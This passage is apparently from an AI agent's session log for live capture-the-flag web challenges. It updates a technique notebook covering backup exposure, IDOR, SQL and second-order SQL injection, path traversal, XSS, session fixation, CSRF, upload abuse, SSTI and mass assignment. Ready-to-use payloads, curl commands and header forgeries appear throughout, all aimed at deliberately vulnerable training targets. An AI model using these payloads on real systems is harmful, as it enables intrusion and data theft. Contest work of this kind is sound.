Again Later (cal. 23)** -- second-order SQLi. Clues `{framework: \"Sinatra\", feature_route: /submit-<hex6>,\n  secondary_route: /result-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; any POST (form or JSON,\n  even `{}`) -> `{\"ok\":true,\"saved\":true}`; GET secondary runs the stored value in a quoted SQL literal ->\n  `{\"rows\":[...],\"effect\":\"delayed_query_revealed_private_row\"}`, effect printed even with `rows: []`. Form-encoded\n  plants in 25 field names -> `rows: []`; the same payload as JSON (`curl -X POST -H 'Content-Type:\n  application/json' -d '{\"name\":\"x'\"'\"' OR '\"'\"'1'\"'\"'='\"'\"'1'\"'\"' -- \",...}'`) -> `rows: [\"Ordinary workspace\n  note\",\"proof_...\"]`; a `\"`-quoted variant -> `rows: []`, an `x') OR 1=1 -- ` variant -> 500. TT winner `zz' OR 1=1 --`\n  (JSON). `--` comments DID work in both (the handler docstring claiming otherwise is wrong). Single CORRECT 83 s; TT\n  `solver_incomplete` 41 s (handler not yet written), live worker hand-solved; Mastery solve 6.4 s (189 s preparing).\n- **D13 Posted Too Much (cal. 23)** -- mass assignment. Clues `{framework: \"NestJS\", feature_route: /inspect-<hex6>,\n  secondary_route: /audit-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; GET secondary -> 403\n  `administrator_required`. POST JSON `{\"display_name\":\"bob\",\"role\":\"admin\",\"is_admin\":true,\"admin\":true}` -> `201\n  {\"ok\":true,\"profile\":{\"display_name\":\"bob\"}}` (privileged keys silently bound, not echoed) -> GET secondary ->\n  `{\"ok\":true,\"effect\":\"bound_privileged_property\",\"evidence\":\"proof_...\"}`. Single CORRECT 59 s; TT\n  `solver_incomplete` 12.9 s (solve.py was a stub), live worker sent role/isAdmin/is_admin/admin/roles/access_level/\n  permissions in one body -> CORRECT; Mastery solve 4.6 s (175 s preparing).\n\n## GM answer conventions learned\n- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.\n  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.\n- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),\n  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12, proof in `rows[]`),\n  `bound_privileged_property` (D13, proof in `evidence`). D09 `changed_across_sites:true` + `evidence`; D10, D11 proof\n  in rendered HTML; D07 in a moderator receipt.\n- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.\n\n## Pitfalls that cost time\n- Shipping a new day without its class handler: D09, D10, D12, D13 TT all `solver_incomplete`. Write the\n  `lib/web/handlers/dayNN_*.py` plugin (KEY_MAP + HANDLERS) BEFORE the single submit, like D11 did.\n- Treating `effect` as success: D12's reader prints its effect with `rows: []`. Success = proof regex.\n- Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first.\n- Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.\n- A 500 on `{{unknown}}` (D11 Spring JSON) means \"undefined variable\", not \"not injectable\"; `{{objective}}` worked.\n- Choosing routes by the WORD in a clue value -- words are re-dealt within a day (D12 result->internal, D13\n  audit->internal); use clue keys / openapi. Routing by prompt keywords in Mastery (earlier-day targets get today's\n  prompt). One-level crawls (D01 proof sits one link below the index). Solvers importing each other's `fallback()`.\n- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.\n- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.\n- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.\n- Trusting the app's stated policy (\"txt only\", \"token required\"): D09/D10 rules were decorative.\n- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.\n\n## reviewer cross-check (measured on a parallel agent; folded into the drivers)\n- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and\n  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to\n  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.\n- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.\n- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.\n"}}}
{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_0129ZWmjorCGaZZhQdqjm3NW","type":"tool_result","content":"The file /home/testpwn/huntress-2026/reference/techniques/web.md has been updated successfully. (file state is current in your context — no need to Read it back)"}]},"parent_tool_use_id":null,"session_id":"05381da5-85e0-49d3-87e4-724cb00f5f8b","uuid":"a007d7fc-6e95-4467-8dfd-003c633a136e","timestamp":"2026-10-23T13:33:20.639Z","tool_use_result":{"type":"update","filePath":"/home/testpwn/huntress-2026/reference/techniques/web.md","content":"# web — technique log (lane-days D01-D13 released; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,\n  22 D09-D10, 23 D11-D13 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the title but not always: D07\n  \"Stored for Later\" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`, so lane-day != folder day).\n  Expect 2-3 lane-days per calendar day (D14-D31 = 18 left for cal. 24-31). Each lane-day = ONE classic bug, named\n  by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\",\n  D04 path traversal \"Stay in Your Directory\", D05 missing function-level authz \"Administratively Speaking\", D06\n  reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for Later\", D08 session fixation \"Session Impression\",\n  D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading Expectations\", D11 SSTI \"Template Temper\", D12\n  second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too Much\". Arc: info-disclosure -> access control\n  -> injection -> file read -> access control -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi ->\n  mass assignment (server-side / API turn since D10; D10-D12 are \"injection, one level deeper\" sequels).\n- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",\n  \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After\n  CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle.\n- **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.\n  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.\n- **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security\n  boundary\"; framework banner = costume: Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS). `GET\n  /api/clues` names everything: `framework`, `feature_route: /<word>-<hex6>`, usually `secondary_route:\n  /<word>-<hex6>`, `current_role: analyst`, plus ZERO or ONE concept key (`session_hint`, `callback_nonce`,\n  `moderator_data_route`, `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+\n  `upload_policy`+`upload_shape`). D11-D13 had NO concept key (D11 not even `secondary_route`): the prompt + the\n  bare-route errors are then the only routing signal. Routes answer JSON errors that say what is missing\n  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `signed_in_session_required`,\n  `invalid_destination`, `method_not_allowed`, `file_not_found`, `post_required` (405), `administrator_required`\n  (403)). Success = `{\"ok\":true,\"effect\":\"<snake_case>\",\"evidence\":\"proof_...\"}`, a concept-shaped JSON carrying the\n  proof (`evidence`, `rows[]`), or the proof inline in a rendered page (D10, D11).\n- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers\n  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.\n- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, **3 since D08**); the prompt\n  describes only today's bug. Earlier bugs seen in Mastery so far: D01 (x3), D02 (x2), D04, D05 (D11-D13 composition\n  not logged: the solver answered all 3 targets in 4-6 s). Mastery targets often sit ~3-5 min in `preparing` (D12\n  189 s, D13 175 s; D11 7.5 s); singles / TT 4-10 s.\n- **A new class beats the generic seed unless the handler ships before TT.** D09, D10, D12, D13 TT all came back\n  `solver_incomplete` (13-41 s): solve.py had no handler for the new class. D11 is the counter-example: the single\n  worker wrote the `lib/web/handlers/day23_*.py` plugin BEFORE submitting -> TT correct first try (solve 5.2 s) and\n  Mastery 4.4 s. The orchestrator starts TT ~1 min after single CORRECT, before a separate codify worker finishes.\n\n## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)\n- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question\n  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on\n  every target (home, robots, /api/clues, /openapi.json), run the probes the recon hints first, the rest staged;\n  targets in threads. Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).\n- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |\n  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `staff-<hex8>`; render (D10)\n  `account` | `internal` | `result`; D09 `preferences_route` fixed `/preferences`. Seen within one day: D12 secondary\n  `result` (single) -> `internal` (TT); D13 `audit` -> `internal`. Rule: pick routes by clue KEY role\n  (`feature_route`, `secondary_route`, `*_data_route`, `*_template`), never by the word in the value.\n- **Clue key set**: with a concept key (D06-D10) | only `feature_route`+`secondary_route` (D12, D13) | only\n  `feature_route` (D05, D11). Rule: no concept key -> classify from the prompt + bare GET of each route (`post_required`\n  = a POST sink; 403 `administrator_required` = privilege check; HTML `<pre>` echo = render sink).\n- **Request body encoding (D12, D13)**: POST-only routes accept form AND JSON with `{\"ok\":true,\"saved\":true}` /\n  `201 {\"ok\":true,\"profile\":{...}}`, but only the JSON body is bound (D12 form plant -> `rows: []`). Rule: send\n  JSON first (form second), every candidate field in one body.\n- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file `environment-copy-<hex>\n  .json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2 crawl, regex `proof_`.\n- **IDOR (D02)** foreign ids in `/api/history`. **SQLi (D03)** `('%..%')` wrapper -> tautologies over `'` `')` `'))`\n  `\"` + `--`/`#` (and quote-balanced, see cross-check). **LFI (D04)** every param whose value has `.`/`/` x `../`*10 +\n  prompt path, absolute, `....//`, `..%2f`, `php://filter`. **Access control (D05)** GET then POST every clue route.\n- **Board noun (D07)**: `/api/messages`+`/messages/{id}` | `/api/postcards`+`/postcards/{id}` -> from openapi/submit `url`.\n- **CSRF (D09)**: route hex, outside mailbox option (`review-NNNN@outside.example.invalid`), token sent or not (both\n  worked). Rule: parse every `<form>` on the clue page; submit the non-current external option cross-site.\n- **Upload (D10)**: route words + skin; \"txt + text/plain\" policy never enforced. Rule: routes by key, preview URL from\n  the upload response's `path`, template syntax from the guide's `<code>`, field `objective`.\n- **SSTI (D11)**: feature `/process-<hex6>`, param `template` (`message`, `q`, `name`, `text`, `input` rendered empty),\n  delimiter `{{..}}` evaluated while `${..}` / `*{..}` came back literal under a \"Spring Boot\" costume; context var\n  `objective`; other names -> Spring-style 500 JSON. TT + Mastery passed with the same handler. Rule: per candidate\n  param send one probe holding every delimiter family with distinct arithmetic (`{{49*1}}|${50*1}|...`), keep the\n  family whose number appears evaluated, then ask it for `objective` (then `proof`, `flag`).\n- **Second-order SQLi (D12)**: winning plant `x' OR '1'='1' -- ` (single) and `zz' OR 1=1 --` (TT), both JSON, every\n  common field at once (`name,q,query,note,label,title,value,filter,search,term,report,...`). Rule: plant the ladder\n  (quote-balanced, paren, `--`-terminated) as JSON then form, re-GET `secondary_route` after EACH plant.\n- **Mass assignment (D13)**: NestJS costume, echo only `display_name`; single and TT both passed with one JSON body\n  holding `display_name` + `role:\"admin\"|\"administrator\"`, `is_admin`, `isAdmin`, `admin`, `roles:[\"admin\"]`,\n  `access_level`, `permissions` (which key bound is unknown -- the echo hides it). State is server-side per target,\n  no cookie. Rule: bind the whole privilege set in one POST, then GET `secondary_route`.\n- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]`, a receipt on a board\n  page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on field names or on `effect`.\n\n## Recognition cues -> first move\n- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;\n  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.\n- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login,\n  browser, POST, admin). No concept key -> the prompt's verb names the bug.\n- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.\n  `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.\n- \"repeats everything\", `callback_nonce` -> D06 reflect `<script>fetch('<cb>?nonce=N')</script>` via `?q=`, then GET\n  the callback with same-origin fetch-metadata. \"guestbook\", \"reviewer stops by\", `moderator_data_route` -> D07 stored\n  script fetch(data)->POST receipt; poll. \"plant your session\", `session_hint` -> D08 `?sid=<hint>`.\n- \"obeys whoever asks nicely -- even strangers\", form with hidden `csrf_token` -> D09 cross-site form submit.\n- \"upload form has standards. Low ones\", `upload_shape`/`render_route` -> D10 upload `.html` with `{{objective}}`.\n- \"template engine ... evaluates everything\", \"speak in expressions\", \"incantation\", page \"Rendered message\" with an\n  empty `<pre>` -> D11 SSTI: `GET <feature>?template={{7*7}}` (49), then `?template={{objective}}`.\n- \"plant your question inside the data and come back later\", \"delayed echo\", feature = `post_required`, secondary\n  returns `{\"rows\":[],\"effect\":...}` -> D12 second-order SQLi: POST JSON every field = `x' OR '1'='1' -- `, GET\n  secondary -> `rows` holds the private row.\n- \"the form only asked for your name. But the API binds whatever you hand it\", \"hand it a promotion\", feature\n  `post_required` + secondary 403 `administrator_required` -> D13 mass assignment: POST JSON `display_name` + every\n  privilege key, GET secondary -> `effect: bound_privileged_property` + `evidence`.\n- Proof regex hit = landed; an `effect` alone is NOT (D12 prints its effect with empty rows).\n\n## Day by day\n- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery missed it with a\n  one-level crawl). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --` (plain\n  `' OR '1'='1` failed). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt`; 51 s. D05 GET `/dispatch-<hex6>`\n  -> `effect: framework_authorization_bypassed`; 47 s.\n- **D06-D08 (cal. 21)**: D06 reflected XSS, server-judged: reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET\n  `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`/`Mode: cors`/`Dest: empty`, `Referer: <reflected URL>`,\n  `Origin`, `X-Callback-Nonce` -> `isolated_browser_callback`; 83 s; TT broke on routing by the word `callback`.\n  D07 stored XSS, real moderator bot: POST a `<script>` that fetches the data route with credentials and POSTs\n  `{evidence}` to the receipt route; poll `/messages/{id}`; 78 s; Mastery had `/api/postcards`, receipt after 12 s.\n  D08 session fixation: `GET /action-<hex6>?sid=<hint>` -> `Set-Cookie: arena_session=<hint>` -> GET secondary ->\n  `fixed_session_privilege_transfer`; 116 s; Mastery ~15 min (every solver raced on every target starved the app).\n- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: `/preferences` form (`destination` select, hidden\n  `csrf_token`); submit `?destination=review-NNNN%40outside.example.invalid` with `Sec-Fetch-Site: cross-site`,\n  `Mode: navigate`, `Dest: document`, foreign Referer -> `/api/preferences` `changed_across_sites:true` + `evidence`;\n  70 s. D10 upload: POST `{\"filename\":\"note.html\",\"content\":\"<p>{{objective}}</p>\",\"content_type\":\"text/html\"}` -> GET\n  the returned `path` -> proof in HTML; 58 s. Both TT `solver_incomplete` (~41 s generic race); Mastery 3.9-4.9 s.\n- **D11 Template Temper (cal. 23)** -- SSTI. Clues `{framework: \"Spring Boot\", current_role, feature_route:\n  /process-<hex6>}`, nothing else. Bare GET -> `<article><h1>Rendered message</h1><pre></pre></article>`. One probe\n  per param `a${7*7}b*{7*7}c{{7*7}}d`: only `template` rendered, as `a${7*7}b*{7*7}c49d`. `?template={{objective}}`\n  -> proof in `<pre>`; `{{T(java.lang.Runtime)}}` printed a class (SpEL-ish, RCE was never needed). Single CORRECT\n  105 s; the worker wrote the plugin handler before submitting -> TT CORRECT first try (15.8 s total, solve 5.2 s),\n  Mastery 3 targets 15.4 s.\n- **D12 Ask Again Later (cal. 23)** -- second-order SQLi. Clues `{framework: \"Sinatra\", feature_route: /submit-<hex6>,\n  secondary_route: /result-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; any POST (form or JSON,\n  even `{}`) -> `{\"ok\":true,\"saved\":true}`; GET secondary runs the stored value in a quoted SQL literal ->\n  `{\"rows\":[...],\"effect\":\"delayed_query_revealed_private_row\"}`, effect printed even with `rows: []`. Form-encoded\n  plants in 25 field names -> `rows: []`; the same payload as JSON (`curl -X POST -H 'Content-Type:\n  application/json' -d '{\"name\":\"x'\"'\"' OR '\"'\"'1'\"'\"'='\"'\"'1'\"'\"' -- \",...}'`) -> `rows: [\"Ordinary workspace\n  note\",\"proof_...\"]`; a `\"`-quoted variant -> `rows: []`, an `x') OR 1=1 -- ` variant -> 500. TT winner `zz' OR 1=1 --`\n  (JSON). `--` comments DID work in both (the handler docstring claiming otherwise is wrong). Single CORRECT 83 s; TT\n  `solver_incomplete` 41 s (handler not yet written), live worker hand-solved; Mastery solve 6.4 s (189 s preparing).\n- **D13 Posted Too Much (cal. 23)** -- mass assignment. Clues `{framework: \"NestJS\", feature_route: /inspect-<hex6>,\n  secondary_route: /audit-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; GET secondary -> 403\n  `administrator_required`. POST JSON `{\"display_name\":\"bob\",\"role\":\"admin\",\"is_admin\":true,\"admin\":true}` -> `201\n  {\"ok\":true,\"profile\":{\"display_name\":\"bob\"}}` (privileged keys silently bound, not echoed) -> GET secondary ->\n  `{\"ok\":true,\"effect\":\"bound_privileged_property\",\"evidence\":\"proof_...\"}`. Single CORRECT 59 s; TT\n  `solver_incomplete` 12.9 s (solve.py was a stub), live worker sent role/isAdmin/is_admin/admin/roles/access_level/\n  permissions in one body -> CORRECT; Mastery solve 4.6 s (175 s preparing).\n\n## GM answer conventions learned\n- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.\n  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.\n- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),\n  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12, proof in `rows[]`),\n  `bound_privileged_property` (D13, proof in `evidence`). D09 `changed_across_sites:true` + `evidence`; D10, D11 proof\n  in rendered HTML; D07 in a moderator receipt.\n- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.\n\n## Pitfalls that cost time\n- Shipping a new day without its class handler: D09, D10, D12, D13 TT all `solver_incomplete`. Write the\n  `lib/web/handlers/dayNN_*.py` plugin (KEY_MAP + HANDLERS) BEFORE the single submit, like D11 did.\n- Treating `effect` as success: D12's reader prints its effect with `rows: []`. Success = proof regex.\n- Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first.\n- Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.\n- A 500 on `{{unknown}}` (D11 Spring JSON) means \"undefined variable\", not \"not injectable\"; `{{objective}}` worked.\n- Choosing routes by the WORD in a clue value -- words are re-dealt within a day (D12 result->internal, D13\n  audit->internal); use clue keys / openapi. Routing by prompt keywords in Mastery (earlier-day targets get today's\n  prompt). One-level crawls (D01 proof sits one link below the index). Solvers importing each other's `fallback()`.\n- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.\n- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.\n- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.\n- Trusting the app's stated policy (\"txt only\", \"token required\"): D09/D10 rules were decorative.\n- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.\n\n## reviewer cross-check (measured on a parallel agent; folded into the drivers)\n- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and\n  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to\n  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.\n- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.\n- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.\n","structuredPatch":[{"oldStart":1,"oldLines":167,"newStart":1,"newLines":176,"lines":["-# web — technique log (lane-days D01-D10 released; updated after every day)","+# web — technique log (lane-days D01-D13 released; updated after every day)"," "," How the lane has looked so far (observations, not guarantees):","-- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. day 19 released D01-D03, day 20 D04-D05,","-  day 21 D06-D08, day 22 D09-D10 (GM ids `web-exploitation-day-NN-<slug>`; the slug is NOT always the title: D07","-  \"Stored for Later\" = `web-exploitation-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`). Expect 2-3","-  lane-days per calendar day. Each lane-day = ONE classic bug, named by a title pun: D01 backup exposure \"Back Up a","-  Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\", D04 path traversal \"Stay in Your Directory\", D05","-  missing function-level authz \"Administratively Speaking\", D06 reflected XSS \"Reflect Upon This\", D07 stored XSS","-  \"Stored for Later\", D08 session fixation \"Session Impression\", D09 CSRF \"Forged With Care\", D10 unrestricted upload","-  \"Uploading Expectations\". Arc: info-disclosure -> access control -> injection -> file read -> access control ->","-  client-side (XSS x2) -> session -> CSRF -> upload (server-side turn began at D10).","+- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,","+  22 D09-D10, 23 D11-D13 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the title but not always: D07","+  \"Stored for Later\" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`, so lane-day != folder day).","+  Expect 2-3 lane-days per calendar day (D14-D31 = 18 left for cal. 24-31). Each lane-day = ONE classic bug, named","+  by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\",","+  D04 path traversal \"Stay in Your Directory\", D05 missing function-level authz \"Administratively Speaking\", D06","+  reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for Later\", D08 session fixation \"Session Impression\",","+  D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading Expectations\", D11 SSTI \"Template Temper\", D12","+  second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too Much\". Arc: info-disclosure -> access control","+  -> injection -> file read -> access control -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi ->","+  mass assignment (server-side / API turn since D10; D10-D12 are \"injection, one level deeper\" sequels)."," - **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",","   \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After","   CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle."," - **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.","-  Answer = token `proof_<32 lowercase hex>` printed by the app.","+  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug."," - **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security","-  boundary\"; framework banner = costume: Django, Laravel/`X-Powered-By: PHP/8.3`, Node, FastAPI-style","-  `/openapi.json`). `GET /api/clues` (linked as \"Open workspace notes\") names everything: `framework`,","-  `feature_route: /<word>-<hex6>`, `secondary_route: /<word>-<hex6>`, `current_role: analyst`, plus ONE","-  concept-specific key (`session_hint`, `callback_nonce`, `moderator_data_route`, `receipt_route_template`,","-  `preferences_route` (D09), `render_route`+`preview_guide`+`upload_policy`+`upload_shape` (D10)). The concept key","-  often states the request shape in prose (`upload_shape: \"POST JSON: filename, content, content_type\"`). Routes","-  answer machine-readable JSON errors that say what is missing (`session_id_required`, `authenticated_login_required`,","-  `browser_callback_required`, `signed_in_session_required`, `invalid_destination`, `method_not_allowed`,","-  `file_not_found`). Success = `{\"ok\":true,\"effect\":\"<snake_case>\",\"evidence\":\"proof_...\"}` or a concept-shaped JSON","-  carrying `evidence` (D09 `{\"destination\":..,\"changed_across_sites\":true,\"evidence\":..}`) or the proof inline in a","-  rendered page (D10).","-- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges the request by","-  fetch-metadata headers + Referer (D06 same-origin \"from the reflected page\"; D09 `Sec-Fetch-Site: cross-site`","-  \"from a stranger's page\"). D07: a REAL moderator browser bot visits stored content a few seconds (sometimes >12 s)","-  later and runs your script with its cookies. Try the header-judged form first; it is one request.","+  boundary\"; framework banner = costume: Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS). `GET","+  /api/clues` names everything: `framework`, `feature_route: /<word>-<hex6>`, usually `secondary_route:","+  /<word>-<hex6>`, `current_role: analyst`, plus ZERO or ONE concept key (`session_hint`, `callback_nonce`,","+  `moderator_data_route`, `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+","+  `upload_policy`+`upload_shape`). D11-D13 had NO concept key (D11 not even `secondary_route`): the prompt + the","+  bare-route errors are then the only routing signal. Routes answer JSON errors that say what is missing","+  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `signed_in_session_required`,","+  `invalid_destination`, `method_not_allowed`, `file_not_found`, `post_required` (405), `administrator_required`","+  (403)). Success = `{\"ok\":true,\"effect\":\"<snake_case>\",\"evidence\":\"proof_...\"}`, a concept-shaped JSON carrying the","+  proof (`evidence`, `rows[]`), or the proof inline in a rendered page (D10, D11).","+- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers","+  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first."," - **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, **3 since D08**); the prompt","-  describes only today's bug. Earlier bugs seen in Mastery / compounding so far: D01 (x3), D02 (x2), D04, D05. Mastery","-  targets can take ~5 min in `preparing` (singles / TT 4-10 s; D09/D10 Mastery ~6 s).","-- **A new class beats the generic seed every time.** D09 and D10 TT both came back `solver_incomplete` after ~41 s:","-  the shipped solve.py was only the `lib.web` race (session-fixation handler + earlier days' `answer()`), which has","-  no handler for the new class; the live worker solved TT by hand. The fix that held: a per-class handler keyed on the","-  clue KEY, ~3-5 requests, targets in threads -> Mastery solve 3.9-4.9 s.","+  describes only today's bug. Earlier bugs seen in Mastery so far: D01 (x3), D02 (x2), D04, D05 (D11-D13 composition","+  not logged: the solver answered all 3 targets in 4-6 s). Mastery targets often sit ~3-5 min in `preparing` (D12","+  189 s, D13 175 s; D11 7.5 s); singles / TT 4-10 s.","+- **A new class beats the generic seed unless the handler ships before TT.** D09, D10, D12, D13 TT all came back","+  `solver_incomplete` (13-41 s): solve.py had no handler for the new class. D11 is the counter-example: the single","+  worker wrote the `lib/web/handlers/day23_*.py` plugin BEFORE submitting -> TT correct first try (solve 5.2 s) and","+  Mastery 4.4 s. The orchestrator starts TT ~1 min after single CORRECT, before a separate codify worker finishes."," "," ## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)"," - **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question","   `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts."," - **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on","-  every target (home, robots, /api/clues, /openapi.json), then run the concept probes the recon hints first, the rest","-  after. Earlier solvers' `answer()` ONLY -- day-21 solvers' `fallback()`s import each other (infinite recursion =","-  timeout). Running every probe at once x3 targets slowed each 2-5x: stage them.","+  every target (home, robots, /api/clues, /openapi.json), run the probes the recon hints first, the rest staged;","+  targets in threads. Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other)."," - **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |","-  `inspect`; secondary `callback` | `internal` | `status` | `staff-<hex8>`; render (D10) `account` | `internal` |","-  `result`; D09 `preferences_route` was the fixed `/preferences`. Rule: pick routes by clue KEY role (`feature_route`,","-  `secondary_route`, `*_data_route`, `*_template`), never by the word in the value (D06 TT broke on `/internal-`).","-- **Resource noun on boards** (D07): `/api/messages` + `/messages/{id}` | `/api/postcards` + `/postcards/{id}`.","-  Rule: take the submit route and the `/<noun>/{id}` view from `/openapi.json` `paths` / the submit response's","-  `url`, else the home page (it lists every entry with its receipt).","-- **Backup 